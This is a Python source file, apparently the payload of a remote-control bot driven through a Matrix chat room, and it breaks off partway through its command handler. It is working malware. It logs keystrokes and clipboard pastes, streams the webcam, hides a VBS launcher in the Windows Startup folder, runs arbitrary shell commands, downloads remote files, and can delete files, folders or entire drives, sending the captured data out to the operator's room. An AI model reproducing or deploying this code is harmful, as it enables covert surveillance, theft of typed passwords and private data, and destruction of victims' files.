#!/usr/bin/env python3
"""
b_s.py - Matrix bot for remote PC control
This file is downloaded and run by bot_starter.vbs
"""

import asyncio
import os
import sys
import time
import threading
import subprocess
import psutil
from datetime import datetime, timezone
import tempfile
from pathlib import Path
import pyautogui
import pyperclip
from pynput import keyboard, mouse
import queue
from collections import deque
import zipfile
import urllib.request
import urllib.parse
import cv2
import base64
import io
from PIL import Image
import string
import random


# Matrix configuration (will be replaced by bot_starter.vbs)
BOT_NAME = "PLACEHOLDER_BOT_NAME"
USERNAME = "PLACEHOLDER_USERNAME"
PASSWORD = "PLACEHOLDER_PASSWORD"
ROOM_ID = "PLACEHOLDER_ROOM_ID"
HOMESERVER = "PLACEHOLDER_HOMESERVER"

class KeyLogger:
    def __init__(self, bot_instance):
        self.bot = bot_instance
        self.mode = None  # 'word' or 'key'
        self.is_active = False
        self.recorded_data = deque()
        self.current_word = ""
        self.key_buffer = []
        self.last_activity_time = time.time()
        self.keyboard_listener = None
        self.mouse_listener = None
        self.modifier_keys = set()
        self.auto_send_task = None
        self.send_queue = queue.Queue()  # Thread-safe queue for sending data
        self.loop = None  # Will store the main event loop
        
        # Special key mappings
        self.special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.tab: '\t',
            keyboard.Key.enter: '\n',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.delete: '[DELETE]',
            keyboard.Key.up: '[UP]',
            keyboard.Key.down: '[DOWN]',
            keyboard.Key.left: '[LEFT]',
            keyboard.Key.right: '[RIGHT]',
            keyboard.Key.home: '[HOME]',
            keyboard.Key.end: '[END]',
            keyboard.Key.page_up: '[PAGE_UP]',
            keyboard.Key.page_down: '[PAGE_DOWN]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.f1: '[F1]', keyboard.Key.f2: '[F2]', keyboard.Key.f3: '[F3]',
            keyboard.Key.f4: '[F4]', keyboard.Key.f5: '[F5]', keyboard.Key.f6: '[F6]',
            keyboard.Key.f7: '[F7]', keyboard.Key.f8: '[F8]', keyboard.Key.f9: '[F9]',
            keyboard.Key.f10: '[F10]', keyboard.Key.f11: '[F11]', keyboard.Key.f12: '[F12]'
        }

    def start_listening(self, mode):
        """Start keylogging in specified mode"""
        if self.is_active:
            return False, "Keylogger is already active"
        
        # Store the current event loop
        try:
            self.loop = asyncio.get_running_loop()
        except RuntimeError:
            return False, "No running event loop found"
        
        self.mode = mode
        self.is_active = True
        self.recorded_data.clear()
        self.current_word = ""
        self.key_buffer = []
        self.modifier_keys.clear()
        self.last_activity_time = time.time()
        
        try:
            # Start keyboard listener
            self.keyboard_listener = keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release,
                suppress=False  # Don't suppress keys
            )
            self.keyboard_listener.start()
            
            # Start mouse listener  
            self.mouse_listener = mouse.Listener(
                on_click=self.on_mouse_click,
                suppress=False  # Don't suppress mouse events
            )
            self.mouse_listener.start()
            
            # Start auto-send timer and queue processor
            self.start_auto_send_timer()
            self.start_queue_processor()
            
            return True, f"Started keylogging in {mode} mode"
            
        except Exception as e:
            self.is_active = False
            return False, f"Failed to start keylogger: {str(e)}"

    def stop_listening(self):
        """Stop keylogging"""
        self.is_active = False
        
        if self.keyboard_listener:
            self.keyboard_listener.stop()
            self.keyboard_listener = None
            
        if self.mouse_listener:
            self.mouse_listener.stop()
            self.mouse_listener = None
            
        if self.auto_send_task:
            self.auto_send_task.cancel()
            self.auto_send_task = None

    def on_key_press(self, key):
        """Handle key press events"""
        if not self.is_active:
            return
            
        self.last_activity_time = time.time()
        
        try:
            # Track modifier keys
            if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                self.modifier_keys.add('ctrl')
            elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
                self.modifier_keys.add('alt')
            elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
                self.modifier_keys.add('shift')
            elif key == keyboard.Key.cmd:
                self.modifier_keys.add('cmd')
            
            # Handle special key combinations
            if 'ctrl' in self.modifier_keys:
                if hasattr(key, 'char') and key.char:
                    combo = f"Ctrl+{key.char.upper()}"
                    if key.char.lower() == 'v':
                        # Handle paste operation
                        try:
                            clipboard_content = pyperclip.paste()
                            if clipboard_content:
                                self.process_text_input(f"[PASTE: {clipboard_content[:100]}{'...' if len(clipboard_content) > 100 else ''}]")
                        except Exception:
                            self.process_text_input("[PASTE]")
                    elif key.char.lower() == 'c':
                        self.process_text_input("[COPY]")
                    elif key.char.lower() == 'x':
                        self.process_text_input("[CUT]")
                    elif key.char.lower() == 'z':
                        self.process_text_input("[UNDO]")
                    elif key.char.lower() == 'y':
                        self.process_text_input("[REDO]")
                    else:
                        self.process_text_input(f"[{combo}]")
                return
            
            # Handle Enter key - trigger send
            if key == keyboard.Key.enter:
                self.process_text_input('\n')
                self.queue_send_data()
                return
            
            # Process regular keys
            if hasattr(key, 'char') and key.char:
                # Regular character
                self.process_text_input(key.char)
            elif key in self.special_keys:
                # Special key
                special_char = self.special_keys[key]
                self.process_text_input(special_char)
            else:
                # Other special keys
                self.process_text_input(f"[{str(key).replace('Key.', '').upper()}]")
                
        except Exception as e:
            print(f"Error in key press handler: {e}")

    def on_key_release(self, key):
        """Handle key release events"""
        if not self.is_active:
            return
            
        # Remove modifier keys when released
        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            self.modifier_keys.discard('ctrl')
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            self.modifier_keys.discard('alt')
        elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
            self.modifier_keys.discard('shift')
        elif key == keyboard.Key.cmd:
            self.modifier_keys.discard('cmd')

    def on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        if not self.is_active or not pressed:
            return
            
        self.last_activity_time = time.time()
        
        if button == mouse.Button.left:
            self.process_text_input("[LMB_CLICK]")
            self.queue_send_data()
        elif button == mouse.Button.right:
            self.process_text_input("[RMB_CLICK]")
            self.queue_send_data()

    def process_text_input(self, text):
        """Process text input based on current mode"""
        if self.mode == 'key':
            self.key_buffer.append(text)
            if len(self.key_buffer) >= 20:
                chunk = ''.join(self.key_buffer)
                self.recorded_data.append(chunk)
                self.key_buffer = []
        elif self.mode == 'word':
            self.process_word_mode(text)

    def process_word_mode(self, text):
        """Intelligent word processing for word mode"""
        if text in [' ', '\t', '\n'] or text.startswith('[') and text.endswith(']'):
            # Word separator or special key
            if self.current_word.strip():
                self.recorded_data.append(self.current_word.strip())
                self.current_word = ""
            
            if text.strip():  # Don't add empty spaces
                if text == '\n':
                    self.recorded_data.append('[ENTER]')
                elif text.startswith('['):
                    self.recorded_data.append(text)
                else:
                    self.recorded_data.append(text)
        elif text == '[BACKSPACE]':
            if self.current_word:
                self.current_word = self.current_word[:-1]
            elif self.recorded_data:
                # Remove last word/element
                last_item = self.recorded_data.pop()
                if isinstance(last_item, str) and not last_item.startswith('['):
                    self.current_word = last_item[:-1] if len(last_item) > 1 else ""
        else:
            # Regular character
            self.current_word += text

    def queue_send_data(self):
        """Queue data to be sent (thread-safe)"""
        try:
            self.send_queue.put("SEND_NOW", block=False)
        except queue.Full:
            pass  # Queue is full, skip this send request

    def start_queue_processor(self):
        """Start the queue processor task"""
        async def process_queue():
            while self.is_active:
                try:
                    # Check if there's a send request in the queue
                    try:
                        self.send_queue.get_nowait()
                        await self.send_recorded_data()
                    except queue.Empty:
                        pass
                    
                    await asyncio.sleep(0.1)  # Small delay to prevent CPU overuse
                except Exception as e:
                    print(f"Error in queue processor: {e}")
                    
        asyncio.create_task(process_queue())

    def start_auto_send_timer(self):
        """Start the auto-send timer"""
        async def auto_send_loop():
            while self.is_active:
                try:
                    await asyncio.sleep(1)  # Check every second
                    if self.is_active and time.time() - self.last_activity_time > 10:
                        await self.send_recorded_data()
                except Exception as e:
                    print(f"Error in auto-send timer: {e}")
                    
        self.auto_send_task = asyncio.create_task(auto_send_loop())

    async def send_recorded_data(self):
        """Send recorded data to Matrix chat"""
        if not self.recorded_data and not self.current_word and not self.key_buffer:
            return
            
        try:
            # Prepare data to send
            data_to_send = []
            
            if self.mode == 'key':
                # Add any remaining key buffer
                if self.key_buffer:
                    data_to_send.extend(self.key_buffer)
                    self.key_buffer = []
                # Add recorded chunks
                data_to_send.extend(list(self.recorded_data))
            elif self.mode == 'word':
                # Add current word if exists
                if self.current_word.strip():
                    data_to_send.append(self.current_word.strip())
                    self.current_word = ""
                # Add recorded words
                data_to_send.extend(list(self.recorded_data))
            
            if data_to_send:
                # Format the message
                if self.mode == 'key':
                    message = f"[{self.mode.upper()}_MODE] {''.join(data_to_send)}"
                else:
                    message = f"[{self.mode.upper()}_MODE] {' '.join(data_to_send)}"
                    
                # Send to Matrix
                await client.room_send(
                    room_id=ROOM_ID,
                    message_type="m.room.message",
                    content={"msgtype": "m.text", "body": message}
                )
                
                # Clear recorded data
                self.recorded_data.clear()
                
        except Exception as e:
            print(f"Error sending recorded data: {e}")



# Try to import matrix-nio
try:
    from nio import AsyncClient, MatrixRoom, RoomMessageText, LoginResponse, SyncResponse
except ImportError:
    print("Error: matrix-nio not installed. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "matrix-nio[e2e]"])
    from nio import AsyncClient, MatrixRoom, RoomMessageText, LoginResponse, SyncResponse

# Global variables
client = None
keylogger = None
camera_streamer = None
connection_timestamp = None  # This will be in Matrix server time (milliseconds)
temp_dir = os.environ.get('TEMP', tempfile.gettempdir())
lock_file = os.path.join(temp_dir, "matrix_bot_temp", "bot.lock")
running = True



def update_lock_file():
    """Continuously update lock file to indicate bot is running"""
    global running
    
    # Ensure directory exists
    try:
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        print(f"Lock file directory created/verified: {os.path.dirname(lock_file)}")
    except Exception as e:
        print(f"Error creating lock file directory: {e}")
    
    while running:
        try:
            with open(lock_file, 'w') as f:
                f.write(str(time.time()))
            print(f"Lock file updated: {lock_file}")
            time.sleep(10)  # Update every 10 seconds
        except Exception as e:
            print(f"Error updating lock file: {e}")
            time.sleep(10)

def terminate_processes():
    """Terminate b_s.py and b_m.py processes"""
    terminated = []
    errors = []
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline', [])
                if cmdline and len(cmdline) > 1:
                    # Check if it's a Python process running b_s.py or b_m.py
                    if ('python' in cmdline[0].lower() and 
                        any('b_s.py' in arg or 'b_m.py' in arg for arg in cmdline)):
                        proc.terminate()
                        terminated.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Wait for processes to terminate
        time.sleep(2)
        
        # Force kill if still running
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline', [])
                if cmdline and len(cmdline) > 1:
                    if ('python' in cmdline[0].lower() and 
                        any('b_s.py' in arg or 'b_m.py' in arg for arg in cmdline)):
                        proc.kill()
                        terminated.append(f"{proc.info['name']} (PID: {proc.info['pid']}) - force killed")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
    except Exception as e:
        errors.append(str(e))
    
    return terminated, errors

def get_startup_vbs_path():
    """Get path to bot_starter.vbs in startup folder"""
    startup_folder = os.path.expandvars(
        r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    )
    return os.path.join(startup_folder, "bot_starter.vbs")

def hide_vbs_file():
    """Hide the bot_starter.vbs file"""
    try:
        vbs_path = get_startup_vbs_path()
        if os.path.exists(vbs_path):
            # Set hidden attribute
            subprocess.run(['attrib', '+H', vbs_path], check=True)
            return True
    except Exception as e:
        print(f"Error hiding VBS file: {e}")
    return False

def delete_vbs_file():
    """Delete the bot_starter.vbs file"""
    try:
        vbs_path = get_startup_vbs_path()
        if os.path.exists(vbs_path):
            # Remove hidden attribute first if it exists
            try:
                subprocess.run(['attrib', '-H', vbs_path], check=False)
            except:
                pass
            os.remove(vbs_path)
            return True
    except Exception as e:
        print(f"Error deleting VBS file: {e}")
    return False

def shutdown_pc():
    """Shutdown the PC"""
    try:
        subprocess.run(['shutdown', '/s', '/t', '5'], check=True)
        return True
    except Exception as e:
        print(f"Error shutting down PC: {e}")
        return False

def restart_pc():
    """Restart the PC"""
    try:
        subprocess.run(['shutdown', '/r', '/t', '5'], check=True)
        return True
    except Exception as e:
        print(f"Error restarting PC: {e}")
        return False

def terminate_all_processes():
    """Terminate all Python and VBS processes (VBS first, then Python)"""
    terminated = []
    errors = []
    
    try:
        # STEP 1: First terminate all VBS processes
        print("Terminating VBS processes first...")
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                proc_info = proc.info
                cmdline = proc_info.get('cmdline', []) or []
                name = (proc_info.get('name') or '').lower()
                
                # Kill VBS processes (including hidden/silent ones)
                if ('wscript' in name or 'cscript' in name or
                    (cmdline and any(str(arg).lower().endswith('.vbs') for arg in cmdline if arg))):
                    proc.terminate()
                    terminated.append(f"VBS process {name} (PID: {proc_info['pid']})")
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        # Wait for VBS processes to terminate
        time.sleep(2)
        
        # Force kill VBS processes if still running
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                proc_info = proc.info
                cmdline = proc_info.get('cmdline', []) or []
                name = (proc_info.get('name') or '').lower()
                
                if ('wscript' in name or 'cscript' in name or
                    (cmdline and any(str(arg).lower().endswith('.vbs') for arg in cmdline if arg))):
                    proc.kill()
                    terminated.append(f"VBS process {name} (PID: {proc_info['pid']}) - force killed")
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        print("VBS processes terminated. Now terminating Python processes...")
        
        # STEP 2: Then terminate all Python processes
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                proc_info = proc.info
                cmdline = proc_info.get('cmdline', []) or []
                name = (proc_info.get('name') or '').lower()
                exe = (proc_info.get('exe') or '').lower()
                
                # Kill Python processes
                if ('python' in name or 
                    (cmdline and any('python' in str(arg).lower() for arg in cmdline if arg)) or
                    'python' in exe):
                    proc.terminate()
                    terminated.append(f"Python process {name} (PID: {proc_info['pid']})")
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        # Wait for Python processes to terminate
        time.sleep(2)
        
        # Force kill Python processes if still running
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                proc_info = proc.info
                cmdline = proc_info.get('cmdline', []) or []
                name = (proc_info.get('name') or '').lower()
                exe = (proc_info.get('exe') or '').lower()
                
                if ('python' in name or 
                    (cmdline and any('python' in str(arg).lower() for arg in cmdline if arg)) or
                    'python' in exe):
                    proc.kill()
                    terminated.append(f"Python process {name} (PID: {proc_info['pid']}) - force killed")
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
                
        print("All processes terminated successfully.")
                
    except Exception as e:
        errors.append(str(e))
    
    return terminated, errors

def clear_startup_directory():
    """Clear the entire startup directory"""
    try:
        startup_folder = os.path.expandvars(
            r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )
        
        if not os.path.exists(startup_folder):
            return False, "Startup folder not found"
        
        deleted_items = []
        for item in os.listdir(startup_folder):
            item_path = os.path.join(startup_folder, item)
            try:
                # Remove hidden attribute if it exists
                try:
                    subprocess.run(['attrib', '-H', '-S', '-R', item_path], check=False)
                except:
                    pass
                
                if os.path.isfile(item_path):
                    os.remove(item_path)
                    deleted_items.append(f"File: {item}")
                elif os.path.isdir(item_path):
                    import shutil
                    shutil.rmtree(item_path)
                    deleted_items.append(f"Folder: {item}")
            except Exception as e:
                return False, f"Failed to delete {item}: {str(e)}"
        
        return True, f"Deleted {len(deleted_items)} items from startup directory"
        
    except Exception as e:
        return False, str(e)

def delete_folder(folder_path):
    """Delete a folder and all its contents"""
    try:
        if not os.path.exists(folder_path):
            return False, "Folder does not exist"
        
        if not os.path.isdir(folder_path):
            return False, "Path is not a folder"
        
        import shutil
        shutil.rmtree(folder_path)
        return True, "Deleted successfully"
        
    except Exception as e:
        return False, str(e)

def delete_file(file_path):
    """Delete a specific file"""
    try:
        if not os.path.exists(file_path):
            return False, "File does not exist"
        
        if not os.path.isfile(file_path):
            return False, "Path is not a file"
        
        # Remove read-only/hidden attributes if they exist
        try:
            subprocess.run(['attrib', '-H', '-S', '-R', file_path], check=False)
        except:
            pass
        
        os.remove(file_path)
        return True, "Deleted successfully"
        
    except Exception as e:
        return False, str(e)

def clear_drive(drive_letter):
    """Clear all contents of a drive"""
    try:
        # Normalize drive letter
        if not drive_letter.endswith(':'):
            drive_letter += ':'
        if not drive_letter.endswith('\\'):
            drive_letter += '\\'
        
        if not os.path.exists(drive_letter):
            return False, "Drive does not exist"
        
        deleted_count = 0
        errors = []
        
        for item in os.listdir(drive_letter):
            item_path = os.path.join(drive_letter, item)
            try:
                # Remove attributes
                try:
                    subprocess.run(['attrib', '-H', '-S', '-R', item_path], check=False)
                except:
                    pass
                
                if os.path.isfile(item_path):
                    os.remove(item_path)
                    deleted_count += 1
                elif os.path.isdir(item_path):
                    import shutil
                    shutil.rmtree(item_path)
                    deleted_count += 1
            except Exception as e:
                errors.append(f"{item}: {str(e)}")
        
        if errors:
            return False, f"Deleted {deleted_count} items, but {len(errors)} failed: {'; '.join(errors[:3])}"
        else:
            return True, f"Deleted successfully - {deleted_count} items removed"
        
    except Exception as e:
        return False, str(e)

def download_and_extract_dropbox(dropbox_url, destination_path):
    """Download and extract files/folders from Dropbox"""
    try:
        # Ensure the URL has dl=1 parameter for direct download
        if 'dl=0' in dropbox_url:
            dropbox_url = dropbox_url.replace('dl=0', 'dl=1')
        elif 'dl=1' not in dropbox_url:
            separator = '&' if '?' in dropbox_url else '?'
            dropbox_url += f'{separator}dl=1'
        
        # Create destination directory if it doesn't exist
        os.makedirs(destination_path, exist_ok=True)
        
        # Download the file
        temp_file = os.path.join(temp_dir, f"dropbox_download_{int(time.time())}.zip")
        
        urllib.request.urlretrieve(dropbox_url, temp_file)
        
        # Check if it's a zip file (folder) or regular file
        try:
            with zipfile.ZipFile(temp_file, 'r') as zip_ref:
                # It's a zip file (folder), extract it
                zip_ref.extractall(destination_path)
                extracted_items = zip_ref.namelist()
                os.remove(temp_file)  # Clean up temp file
                return True, f"Extracted {len(extracted_items)} items to {destination_path}"
        except zipfile.BadZipFile:
            # It's a regular file, move it to destination
            filename = os.path.basename(urllib.parse.urlparse(dropbox_url).path)
            if not filename or filename == '':
                filename = f"downloaded_file_{int(time.time())}"
            
            final_path = os.path.join(destination_path, filename)
            os.rename(temp_file, final_path)
            return True, f"Downloaded file to {final_path}"
            
    except Exception as e:
        # Clean up temp file if it exists
        try:
            if 'temp_file' in locals() and os.path.exists(temp_file):
                os.remove(temp_file)
        except:
            pass
        return False, f"Download failed: {str(e)}"

def run_terminal_command(command):
    """Run terminal command and return output"""
    try:
        # Run command in background and capture output
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=30  # 30 second timeout
        )
        
        output = ""
        if result.stdout:
            output += f"STDOUT:\n{result.stdout}\n"
        if result.stderr:
            output += f"STDERR:\n{result.stderr}\n"
        
        output += f"Return code: {result.returncode}"
        
        return True, output
        
    except subprocess.TimeoutExpired:
        return False, "Command timed out (30 seconds)"
    except Exception as e:
        return False, f"Command failed: {str(e)}"

def get_safe_folder_name(base_name, max_length=50):
    """Generate a safe folder name within Windows limits"""
    # Remove invalid characters
    invalid_chars = '<>:"/\\|?*'
    safe_name = ''.join(c for c in base_name if c not in invalid_chars)
    
    # Truncate if too long
    if len(safe_name) > max_length:
        safe_name = safe_name[:max_length]
    
    # Ensure it doesn't end with a period or space
    safe_name = safe_name.rstrip('. ')
    
    # If empty after cleaning, generate a random name
    if not safe_name:
        safe_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    return safe_name

def create_5ary_tree(root_path, depth, current_depth=0):
    """Create a 5-ary tree of folders"""
    if current_depth >= depth:
        return True, "Max depth reached"
    
    try:
        # Create root directory if it doesn't exist
        if current_depth == 0:
            os.makedirs(root_path, exist_ok=True)
            # Hide the root folder
            try:
                subprocess.run(['attrib', '+H', root_path], check=False)
            except:
                pass
        
        created_folders = 0
        
        # Create 5 child folders
        for i in range(5):
            # Generate folder name with path length checking
            base_name = f"node_{current_depth}_{i}"
            safe_name = get_safe_folder_name(base_name)
            
            child_path = os.path.join(root_path, safe_name)
            
            # Check if the full path would exceed Windows limits (260 characters)
            if len(child_path) > 240:  # Leave some buffer
                continue
            
            try:
                os.makedirs(child_path, exist_ok=True)
                created_folders += 1
                
                # Hide the folder
                try:
                    subprocess.run(['attrib', '+H', child_path], check=False)
                except:
                    pass
                
                # Recursively create children
                create_5ary_tree(child_path, depth, current_depth + 1)
                
            except (OSError, FileNotFoundError) as e:
                # If we hit path length limits, stop creating at this level
                if "path too long" in str(e).lower() or len(child_path) > 240:
                    break
                continue
        
        if current_depth == 0:
            return True, f"Created 5-ary tree with depth {depth} at {root_path}"
        
        return True, "Tree created successfully"
        
    except Exception as e:
        return False, f"Failed to create tree: {str(e)}"

class CameraStreamer:
    def __init__(self, bot_instance):
        self.bot = bot_instance
        self.is_streaming = False
        self.camera = None
        self.stream_task = None
        
    def start_stream(self):
        """Start camera streaming"""
        if self.is_streaming:
            return False, "Camera is already streaming"
        
        try:
            # Try to initialize camera
            self.camera = cv2.VideoCapture(0)
            if not self.camera.isOpened():
                return False, "Could not access camera"
            
            # Set camera properties for better performance
            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            self.camera.set(cv2.CAP_PROP_FPS, 15)
            
            self.is_streaming = True
            
            # Start streaming task
            asyncio.create_task(self.stream_loop())
            
            return True, "Camera streaming started"
            
        except Exception as e:
            return False, f"Failed to start camera: {str(e)}"
    
    def stop_stream(self):
        """Stop camera streaming"""
        self.is_streaming = False
        
        if self.camera:
            self.camera.release()
            self.camera = None
            
        if self.stream_task:
            self.stream_task.cancel()
            self.stream_task = None
    
    async def stream_loop(self):
        """Main streaming loop"""
        try:
            while self.is_streaming and self.camera:
                ret, frame = self.camera.read()
                if not ret:
                    break
                
                # Convert frame to base64
                try:
                    # Resize frame for faster transmission
                    frame = cv2.resize(frame, (320, 240))
                    
                    # Convert to JPEG
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    
                    # Convert to base64
                    frame_base64 = base64.b64encode(buffer).decode('utf-8')
                    
                    # Send frame to Matrix
                    await client.room_send(
                        room_id=ROOM_ID,
                        message_type="m.room.message",
                        content={
                            "msgtype": "m.text",
                            "body": f"[CAMERA_FRAME] {frame_base64[:100]}..." # Truncate for display
                        }
                    )
                    
                except Exception as e:
                    print(f"Error processing frame: {e}")
                
                # Control frame rate
                await asyncio.sleep(0.5)  # 2 FPS
                
        except Exception as e:
            print(f"Camera streaming error: {e}")
        finally:
            self.stop_stream()

async def establish_connection_timestamp():
    """Establish connection timestamp using Matrix server time"""
    global connection_timestamp
    
    try:
        print("Establishing connection timestamp with Matrix server...")
        
        # Do an initial sync to get server time
        response = await client.sync(timeout=5000)
        
        if isinstance(response, SyncResponse):
            # Get the current server timestamp from the sync response
            # We'll use the next_batch token timestamp or current server time
            
            # Send a dummy message to ourselves to get server timestamp
            try:
                # Send a message that we can identify and get its server timestamp
                temp_message = f"__TIMESTAMP_SYNC__{int(time.time())}"
                await client.room_send(
                    room_id=ROOM_ID,
                    message_type="m.room.message",
                    content={
                        "msgtype": "m.text",
                        "body": temp_message
                    }
                )
                
                # Wait a moment and sync to get the message back with server timestamp
                await asyncio.sleep(1)
                sync_response = await client.sync(timeout=5000)
                
                if isinstance(sync_response, SyncResponse):
                    # Look for our timestamp sync message in the room events
                    room_events = sync_response.rooms.join.get(ROOM_ID)
                    if room_events and room_events.timeline and room_events.timeline.events:
                        for event in reversed(room_events.timeline.events):  # Check newest first
                            if (hasattr(event, 'body') and 
                                isinstance(event.body, str) and 
                                event.body.startswith("__TIMESTAMP_SYNC__")):
                                # Found our sync message, use its server timestamp
                                connection_timestamp = event.server_timestamp
                                print(f"Connection timestamp established: {connection_timestamp} (Matrix server time)")
                                return True
                
            except Exception as e:
                print(f"Error with timestamp sync message method: {e}")
            
            # Fallback: use current time converted to milliseconds
            # This is less accurate but better than nothing
            connection_timestamp = int(time.time() * 1000)
            print(f"Connection timestamp established (fallback): {connection_timestamp}")
            return True
            
    except Exception as e:
        print(f"Error establishing connection timestamp: {e}")
    
    # Final fallback
    connection_timestamp = int(time.time() * 1000)
    print(f"Connection timestamp established (final fallback): {connection_timestamp}")
    return False

async def message_callback(room: MatrixRoom, event: RoomMessageText):
    """Handle incoming messages"""
    global connection_timestamp
    
    # Skip if no connection timestamp established
    if connection_timestamp is None:
        print("No connection timestamp - skipping message")
        return
    
    try:
        # Get message timestamp (already in milliseconds from Matrix server)
        message_timestamp = event.server_timestamp
        
        print(f"Message timestamp: {message_timestamp}, Connection timestamp: {connection_timestamp}")
        
        # Skip our own timestamp sync messages
        if hasattr(event, 'body') and event.body.startswith("__TIMESTAMP_SYNC__"):
            print("Skipping timestamp sync message")
            return
        
        # Only respond to messages sent after connection (both timestamps are in milliseconds)
        if message_timestamp <= connection_timestamp:
            print(f"Ignoring old message (sent before connection): {event.body}")
            return
        
        message = event.body.strip()
        print(f"Processing new message: {message}")
        
        # Process commands
        response = await process_command(message)
        
        if response:
            await client.room_send(
                room_id=room.room_id,
                message_type="m.room.message",
                content={
                    "msgtype": "m.text",
                    "body": response
                }
            )
            
    except Exception as e:
        print(f"Error processing message: {e}")

async def process_command(message):
    """Process bot commands"""
    global running
    global camera_streamer
    
    message = message.strip()
    
    # DEFCON 5 - Terminate all Python processes
    if message == f"DEFCON 5 {BOT_NAME}":
        terminated, errors = terminate_all_processes()
        if not errors:
            running = False
            return f"Success from {BOT_NAME} on DEFCON 5"
        else:
            return f"Error from {BOT_NAME} on DEFCON 5: {'; '.join(errors)}"
    
    # DEFCON 4 - Terminate all Python and VBS processes
    elif message == f"DEFCON 4 {BOT_NAME}":
        terminated, errors = terminate_all_processes()
        if not errors:
            running = False
            return f"Success from {BOT_NAME} on DEFCON 4"
        else:
            return f"Error from {BOT_NAME} on DEFCON 4: {'; '.join(errors)}"
    
    # DEFCON 3 - Terminate processes and clear startup directory
    elif message == f"DEFCON 3 {BOT_NAME}":
        terminated, errors = terminate_all_processes()
        if not errors:
            success, msg = clear_startup_directory()
            if success:
                running = False
                return f"Success from {BOT_NAME} on DEFCON 3"
            else:
                return f"Error from {BOT_NAME} on DEFCON 3: {msg}"
        else:
            return f"Error from {BOT_NAME} on DEFCON 3: {'; '.join(errors)}"
    
    # DEFCON 2 - All bots terminate and clear startup
    elif message == "DEFCON 2":
        terminated, errors = terminate_all_processes()
        if not errors:
            success, msg = clear_startup_directory()
            if success:
                running = False
                return f"Success from {BOT_NAME} on DEFCON 2"
            else:
                return f"Error from {BOT_NAME} on DEFCON 2: {msg}"
        else:
            return f"Error from {BOT_NAME} on DEFCON 2: {'; '.join(errors)}"
    
    # Online check
    elif message == f"Are you online {BOT_NAME}":
        return f"Yes {BOT_NAME} is online"
    
    # PC Shutdown
    elif message == f"PC Shutdown {BOT_NAME}":
        if shutdown_pc():
            return f"shutdown confirmed for {BOT_NAME}"
        else:
            return f"Error from {BOT_NAME}: Failed to initiate shutdown"
    
    # PC Restart
    elif message == f"PC Restart {BOT_NAME}":
        if restart_pc():
            return f"restart confirmed for {BOT_NAME}"
        else:
            return f"Error from {BOT_NAME}: Failed to initiate restart"
    
    # Clear out a folder with path
    elif message.startswith(f"Clear out a folder ") and BOT_NAME in message:
        # Extract path: "Clear out a folder path BOT_NAME" -> get path between "folder " and " BOT_NAME"
        start_idx = message.find("Clear out a folder ") + len("Clear out a folder ")
        end_idx = message.rfind(f" {BOT_NAME}")
        if end_idx > start_idx:
            folder_path = message[start_idx:end_idx].strip()
            success, msg = delete_folder(folder_path)
            return msg
        else:
            return "Invalid folder command format"
    
    # Clear out a file with path
    elif message.startswith(f"Clear out a file ") and BOT_NAME in message:
        # Extract path: "Clear out a file path BOT_NAME" -> get path between "file " and " BOT_NAME"
        start_idx = message.find("Clear out a file ") + len("Clear out a file ")
        end_idx = message.rfind(f" {BOT_NAME}")
        if end_idx > start_idx:
            file_path = message[start_idx:end_idx].strip()
            success, msg = delete_file(file_path)
            return msg
        else:
            return "Invalid file command format"
    
    # Clear out a drive with drive letter
    elif message.startswith(f"Clear out a drive ") and BOT_NAME in message:
        # Extract drive: "Clear out a drive D: BOT_NAME" -> get drive between "drive " and " BOT_NAME"
        start_idx = message.find("Clear out a drive ") + len("Clear out a drive ")
        end_idx = message.rfind(f" {BOT_NAME}")
        if end_idx > start_idx:
            drive_name = message[start_idx:end_idx].strip()
            success, msg = clear_drive(drive_name)
            return msg
        else:
            return "Invalid drive command format"
    
    # Start listening in Word Mode
    elif message == f"Start listening in Word Mode {BOT_NAME}":
        try:
            success, msg = keylogger.start_listening('word')
            if success:
                return "Listening in Word Mode"
            else:
                return f"Error starting Word Mode: {msg}"
        except Exception as e:
            return f"Error starting Word Mode: {str(e)}"
    
    # Start listening in Key Mode
    elif message == f"Start listening in Key Mode {BOT_NAME}":
        try:
            success, msg = keylogger.start_listening('key')
            if success:
                return "Listening in Key Mode"
            else:
                return f"Error starting Key Mode: {msg}"
        except Exception as e:
